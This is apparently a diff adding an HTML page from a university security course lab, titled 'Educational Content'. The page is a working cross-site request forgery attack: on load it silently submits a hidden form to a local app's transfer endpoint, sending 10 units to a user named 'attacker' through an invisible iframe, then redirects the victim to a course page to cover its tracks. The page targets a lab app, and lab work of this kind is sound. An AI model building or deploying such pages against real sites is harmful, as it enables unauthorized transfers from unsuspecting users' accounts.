@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Educational Content</title>
+</head>
+<body>
+
+    <iframe name="hidden_iframe" id="target_iframe" style="display:none;"></iframe>
+
+    <form id="csrf_form" action="http://localhost:3000/post_transfer" method="POST" target="hidden_iframe">
+        <input type="hidden" name="destination_username" value="attacker" />
+        <input type="hidden" name="quantity" value="10" />
+    </form>
+
+    <script>
+        var transferTriggered = false;
+
+        window.onload = function() {
+            document.getElementById('csrf_form').submit();
+            transferTriggered = true;
+        };
+
+        document.getElementById('target_iframe').onload = function() {
+            if (transferTriggered) {
+                window.location.replace("http://sharif.edu/~kharrazi/courses/40441-011/");
+            }
+        };
+    </script>
+</body>
+</html>
